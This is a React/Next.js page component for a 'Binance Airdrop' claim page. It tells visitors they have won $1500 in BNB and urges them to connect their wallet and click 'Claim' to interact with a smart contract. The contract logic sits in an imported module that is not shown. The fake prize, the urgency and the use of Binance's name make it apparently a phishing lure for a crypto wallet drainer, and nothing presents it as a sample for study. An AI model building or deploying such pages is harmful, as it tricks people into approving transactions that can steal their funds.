import React from 'react';
import Image from 'next/image';
import styles from '../styles/ClaimAirdrop.module.css';
import { binance } from '../lib/binance.js';

export default function ClaimAirdrop() {
    const connectWallet = async () => {
        try {
            await binance.connectWallet();
        } catch (error) {
            console.error("Failed to connect wallet", error);
        }
    };

    const interactWithContract = async () => {
        try {
            await binance.interactWithContract();
        } catch (error) {
            console.error("Failed to interact with contract", error);
        }
    };

    return (
        <div id="claim-airdrop" className={styles.container}>
            <h2>Binance Airdrop Guide: Claim Your $1500 in BNB Now!</h2>
            <p>Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!</p>
            <Image src="/images/claim-now.jpg" alt="Claim Now" width={500} height={300} />
            <h3>Steps to Claim:</h3>
            <ol>
                <li>
                    <h4>Connect Your Binance Wallet:</h4>
                    <button onClick={connectWallet}>Connect Wallet</button>
                    <p>Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).</p>
                </li>
                <li>
                    <h4>Interact with the Contract:</h4>
                    <button onClick={interactWithContract}>Claim</button>
                    <p>Once your wallet is connected, click on the "Claim" button to interact with the smart contract.</p>
                </li>
            </ol>
            <p>Don't miss out on your $1500 in BNB! Act now to secure your tokens.</p>
        </div>
    );
}